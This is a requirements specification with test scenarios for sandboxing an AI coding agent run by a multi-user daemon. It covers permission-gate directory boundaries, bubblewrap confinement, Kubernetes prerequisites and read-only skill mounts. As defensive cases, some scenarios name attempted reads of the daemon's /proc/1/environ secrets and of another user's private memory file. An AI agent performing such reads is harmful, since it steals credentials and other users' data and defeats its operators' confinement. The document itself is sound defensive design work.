- **THEN** the workspace TMPDIR SHALL be removed

### Requirement: OpenCode Tool-Output Directory Boundary

The restricted-mode ACP permission gate SHALL add the session-scoped OpenCode tool-output directory to its generic-command containment boundaries ONLY when the resolved directory is inside the session workspace or the session TMPDIR (then without duplication if already contained by an existing allowed directory); otherwise SHALL NOT be added and the gate SHALL fail closed, so the shared home-rooted tool-output directory is never within bounds.

#### Scenario: Session-local tool-output directory added to the boundary

- **GIVEN** a session whose tool-output directory resolves to `/app/data/workspaces/discord/123/tmp/opencode-data/opencode/tool-output`
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL be included in the generic-command containment boundaries

#### Scenario: Boundary deduplicated when already contained

- **GIVEN** a session whose tool-output directory resolves inside an existing allowed directory (e.g. the session workspace)
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL NOT be added a second time

#### Scenario: Non-session-local tool-output directory fails closed

- **GIVEN** a session whose tool-output directory would resolve outside the session workspace/TMPDIR
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL NOT be added, and a generic command referencing it SHALL be rejected

#### Scenario: Shared home-rooted tool-output directory never added

- **GIVEN** a session whose tool-output directory would resolve to the shared home-rooted location (`$HOME/.local/share/opencode/tool-output`), outside the session workspace and TMPDIR
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL NOT be added, and a generic command referencing it SHALL be rejected (the gate fails closed)

### Requirement: Agent Filesystem Confinement

When filesystem confinement is enabled (`sandbox.filesystemConfinement`), the agent subprocess SHALL run under a bubblewrap filesystem-namespace confinement with a fresh `/proc` (never a second UID, since the container runs unprivileged under a single UID) that prevents reading the daemon's process environment (`/proc/1/environ`) and other users' workspace directories; if the mechanism is unavailable, the system SHALL fail closed rather than run the agent unconfined.

#### Scenario: Daemon environ not readable by the agent

- **GIVEN** a confined agent subprocess
- **WHEN** the agent attempts to read `/proc/1/environ`
- **THEN** the read SHALL fail (the daemon's environment, including its secrets, is not visible to the agent)

#### Scenario: Cross-user workspace not readable by the agent

- **GIVEN** a confined agent subprocess for user A
- **WHEN** the agent attempts to read `/app/data/workspaces/discord/<userB>/memory.private.jsonl`
- **THEN** the read SHALL fail because user B's workspace is outside the confined filesystem view

#### Scenario: Confinement unavailable fails closed

- **GIVEN** a runtime that does not support the configured confinement mechanism
- **WHEN** the daemon starts and prepares to spawn the agent
- **THEN** it SHALL fail startup with an actionable error rather than spawn the agent without confinement

#### Scenario: Kubernetes runtime cannot satisfy the requirement chain

- **GIVEN** a Kubernetes cluster whose runtime cannot satisfy the full chain (e.g. containerd 1.7, which rejects the `hostUsers: false` that `procMount: Unmasked` requires since K8s 1.30)
- **WHEN** the operator configures the deployment
- **THEN** the documented guidance SHALL be to keep `filesystemConfinement` disabled and rely on the always-on permission gate, environment filtering, and egress mediation
- **AND** if it is enabled anyway, startup SHALL fail closed rather than run the agent unconfined

#### Scenario: Confinement is opt-in and verified before enabling

- **GIVEN** a deployment considering enabling `filesystemConfinement`
- **WHEN** the fresh-`/proc` mount cannot be established (e.g. inside a doubly-nested user namespace under rootless podman) or viability has not been verified against the real deployment
- **THEN** confinement SHALL remain off by default (it is OPT-IN) and SHALL be verified with `scripts/probe-sandbox-caps.sh` before enabling
- **AND** the authoritative permission gate (`requestPermission` routing, generic-command confinement, URI-scheme rejection) SHALL provide the primary protection independent of this defense-in-depth layer

#### Scenario: Kubernetes prerequisite chain must be satisfied for confinement

- **GIVEN** a Kubernetes deployment planning to enable `filesystemConfinement`
- **WHEN** the operator assesses the runtime prerequisites — node unprivileged user namespaces (`user.max_user_namespaces > 0`); an explicit `seccompProfile` and relaxed PodSecurity level (the default containerd profile gates `unshare`/`clone(CLONE_NEWUSER)` on `CAP_SYS_ADMIN`); and `securityContext.procMount: Unmasked` for the `MNT_LOCKED` masked `/proc`, which since K8s 1.30 additionally requires `hostUsers: false` and therefore containerd 2.0+ (or CRI-O ≥ 1.25)
- **THEN** the operator SHALL follow the chain documented in `docs/AGENT_PERMISSIONS.md` and `helm/values.yaml` (established empirically on Talos 1.7.2 / K8s 1.30 / containerd 1.7)
- **AND** clusters that cannot satisfy the chain SHALL keep `filesystemConfinement` disabled and rely on the always-on protections

### Requirement: Resolved Skill Tree Has Read-Only Runtime Visibility

Filesystem confinement SHALL expose the selected agent's resolved skill tree at that same absolute path as a read-only runtime mount. Skill mounting SHALL consume the explicit deployment input rather than rediscover a tree from HOME or session cwd. Legitimate OpenCode container access under `/home/deno/.agents` SHALL remain read-only. A mount SHALL NOT grant script auto-approval, OMP owned provenance or workspace write permission.

#### Scenario: OpenCode container personal installation remains accessible
- **GIVEN** OpenCode's resolved install root is `/home/deno/.agents/skills`
- **WHEN** its confinement arguments are constructed
- **THEN** the existing legitimate `/home/deno/.agents` read-only visibility SHALL remain available
- **AND** the installed skill tree SHALL appear at its exact resolved path without a writable mount

#### Scenario: OMP owned root is exposed without trusting personal skills
- **GIVEN** OMP's resolved root is `/opt/air/skills`
- **WHEN** its confinement arguments are constructed
- **THEN** that tree SHALL be mounted read-only
- **AND** personal-tree presence SHALL NOT add an OMP script grant

#### Scenario: Development and custom install roots are exposed literally
- **GIVEN** the selected root is the repository development tree or an explicitly configured custom directory
- **WHEN** confinement arguments are constructed
- **THEN** that exact resolved directory SHALL be exposed read-only
- **AND** writable workspace/runtime grants SHALL remain unchanged and SHALL NOT override the skill tree's read-only visibility

#### Scenario: Equal or enclosing skill root cannot replace mandatory writable grants
- **GIVEN** the canonical skill root equals or contains a mandatory writable workspace, TMPDIR, shared workspace or runtime mount
- **WHEN** confinement is prepared
- **THEN** preparation SHALL fail before spawn instead of making skills writable or silently making mandatory runtime state read-only

#### Scenario: Child skill tree is mounted after a writable parent
- **GIVEN** the skill tree is a child of a writable mounted parent and contains no mandatory writable descendants
- **WHEN** confinement arguments are constructed
- **THEN** its read-only bind SHALL occur after that parent bind
- **AND** the parent outside the skill tree SHALL retain its existing writable grant
